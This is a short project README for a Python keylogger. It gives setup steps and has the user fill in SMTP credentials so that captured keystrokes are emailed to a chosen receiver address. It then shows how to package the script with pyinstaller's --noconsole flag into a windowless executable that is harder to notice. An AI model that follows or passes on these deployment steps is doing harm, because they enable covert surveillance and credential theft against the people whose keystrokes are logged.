# Keylogger

![developers](https://img.shields.io/badge/Developed%20By%3A-Furman%20Vlad,%20Shukrum%20Gai,%20Berko%20Tal,%20Hazan%20Ori-red)

## HOW TO RUN THIS PROJECT
- Download Keylogger.py
- Open a command prompt or terminal
- Navigate to the directory where your script is located
- Run following command:
```
pip install -r requirements.txt

```
- Change these fields in the code:
```
SENDER_EMAIL = 'example@example.com'
RECEIVER_EMAIL = 'example@example.com'
SMTP_SERVER = 'smtp.example.com' ('smtp.office365.com')
SMTP_PORT = 587
USERNAME = 'example@example.com' (Same as SENDER_EMAIL)
PASSWORD = '*********'

```
- To make convert the .py script to .exe:
- Navigate to the directory where your script is located (cd Desktop) and write:
```
pyinstaller --onefile --noconsole your_script_name.py
```
- You can find the executable file in the dist directory within your script's directory.
- The file will have the same name as your_script_name

## Video
- https://youtu.be/wRjUAHPQq6E
